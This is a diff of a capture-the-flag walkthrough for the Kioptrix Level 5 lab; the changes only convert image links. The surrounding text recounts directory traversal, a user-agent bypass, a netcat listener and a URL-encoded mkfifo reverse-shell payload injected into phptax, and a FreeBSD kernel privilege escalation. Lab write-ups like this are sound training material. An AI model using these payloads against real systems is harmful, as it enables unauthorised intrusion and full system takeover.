@@ -28,66 +28,66 @@ Nmap done: 256 IP addresses (3 hosts up) scanned in 2.98 seconds
 
 After identifying the target IP as *192.168.1.159*, I perform an aggressive **nmap** scan on it to find open ports and running services.
 
-![[IMAGES/1.png]]
+![](IMAGES/1.png)
 
-![[IMAGES/2.png]]
+![](IMAGES/2.png)
 
 Let's start the hack! ;)
 # INITIAL ACCESS
 
 I try fetching information about port 8080, but I am denied access.
 
-![[IMAGES/3.png]]
+![](IMAGES/3.png)
 
 I fetched information about port 80 using **curl** and found an interesting path.
 
-![[IMAGES/4.png]]
+![](IMAGES/4.png)
 
 I accessed the path in the browser and landed on a charting application.
 
-![[IMAGES/5.png]]
+![](IMAGES/5.png)
 
 I used **searchsploit** to look for any available vulnerabilities of this charting system and found a bunch.
 
-![[IMAGES/6.png]]
+![](IMAGES/6.png)
 
-![[IMAGES/7.png]]
+![](IMAGES/7.png)
 
 Based on this, it seems that the application is vulnerable to *directory traversal* and *reflected XSS*.
 
 Hence, to test it out, I tried adding `../../../` at the end of the URL.
 
-![[IMAGES/8.png]]
+![](IMAGES/8.png)
 
-![[IMAGES/9.png]]
+![](IMAGES/9.png)
 
 Now that I know that it works, I go to the **Exploit-DB** website and view the entire information about the directory traversal vulnerability. I find this URL, so I give it a try.
 
-![[IMAGES/10.png]]
+![](IMAGES/10.png)
 
-![[IMAGES/11.png]]
+![](IMAGES/11.png)
 
 I successfully got the */etc/passwd* file. Now I use chat-gpt to find the directory where FreeBSD systems store Apache configuration details.
 
-![[IMAGES/12.png]]
+![](IMAGES/12.png)
 
 Hence, I access this file. Since the **nmap** scan revealed the Apache version, I look for the *apache22* directory.
 
-![[IMAGES/13.png]]
+![](IMAGES/13.png)
 
 I read the configuration file and found the reason I was being denied access to port 8080.
 
-![[IMAGES/14.png]]
+![](IMAGES/14.png)
 
 It required a specific user-agent. I use **curl** to fetch information about that port by adding this user-agent.
 
-![[IMAGES/15.png]]
+![](IMAGES/15.png)
 
 This time, I was able to view the contents. I used **searchsploit** to look into *phptax* for possible exploits.
 
 >PHPtax is a free, open-source web application designed for managing and preparing tax documents. It was created to help individuals and small businesses handle their tax-related tasks more efficiently without needing to invest in expensive commercial software. The application allows users to input their financial data, track their income and expenses, and generate tax forms that are compliant with the relevant regulations. PHPtax is built using PHP, making it accessible for those who have a basic understanding of web development, and can be customized or extended to fit specific needs. Its primary goal is to simplify the tax preparation process while providing a flexible, user-friendly platform.
 
-![[IMAGES/16.png]]
+![](IMAGES/16.png)
 
 I tried the exploit available on **Metasploit**, but it didn't work for me. So, I Googled to look for any other ways.
 
@@ -102,15 +102,15 @@ rlwrap nc -lnvp 4444
 
 I then visited [revshells.com](https://www.revshells.com/) and selected the **nc mkfifo** exploit.
 
-![[IMAGES/17.png]]
+![](IMAGES/17.png)
 
 For increasing the odds of success, I URL encoded this payload.
 
-![[IMAGES/18.png]]
+![](IMAGES/18.png)
 
 Now I edited this URL that was given in the **Exploit-DB** page with my own reverse shell script.
 
-![[IMAGES/19.png]]
+![](IMAGES/19.png)
 
 ```url
 
@@ -119,33 +119,33 @@ http://192.168.1.2:8080/phptax/drawimage.php?pfilez=1040d1-pg2.tob;rm%20%2Ftmp%2
 
 Now I download an extension that allows me to modify the header. This is because I want to execute this URL on my browser, and without the *user-agent* field, I won't be able to access the site.
 
-![[IMAGES/20.png]]
+![](IMAGES/20.png)
 
 I configure it to add the appropriate *user-agent* field.
 
-![[IMAGES/21.png]]
+![](IMAGES/21.png)
 
 I save this and turn my extension on, then paste my URL.
 
-![[IMAGES/22.png]]
+![](IMAGES/22.png)
 
 And voila! I got the initial access.
 
-![[IMAGES/23.png]]
+![](IMAGES/23.png)
 
 # PRIVILEGE ESCALATION
 
 I look around and find the flag inside the root directory. However, I do not have the privilege to read it.
 
-![[IMAGES/24.png]]
+![](IMAGES/24.png)
 
 I view the kernel information using **uname**.
 
-![[IMAGES/25.png]]
+![](IMAGES/25.png)
 
 I look for exploits related to this FreeBSD version.
 
-![[IMAGES/26.png]]
+![](IMAGES/26.png)
 
 I download the first exploit on my PC and check if I have **gcc** installed on the target.
 
@@ -156,17 +156,17 @@ which gcc
 
 Then I move into the *tmp* directory. Since the system does not have **wget**, I found another command that can be used in its place in this [article](https://forums.freebsd.org/threads/what-is-the-download-command-in-freebsd.10123/)
 
-![[IMAGES/27.png]]
+![](IMAGES/27.png)
 
-![[IMAGES/28.png]]
+![](IMAGES/28.png)
 
 I compile and run this exploit.
 
-![[IMAGES/29.png]]
+![](IMAGES/29.png)
 
 Hence, I got root access. Now I move into the root directory and set permissions on the flag.
 
-![[IMAGES/30.png]]
+![](IMAGES/30.png)
 
 >The `777` in `chmod 777` means:
 >- `7` for the owner: read, write, and execute permissions.
@@ -174,7 +174,7 @@ Hence, I got root access. Now I move into the root directory and set permissions
 >- `7` for others: read, write, and execute permissions.
 >So, everyone can read, write, and execute the file.
 
-![[IMAGES/31.png]]
+![](IMAGES/31.png)
 
 # CLOSURE
 
@@ -186,7 +186,7 @@ Here's a summary of how I pwned Kioptrix Level 5:
 
 That's it from my side. See you in the next walkthrough.
 
-![[IMAGES/32.png]]
+![](IMAGES/32.png)
 
 Happy Hacking :)
 
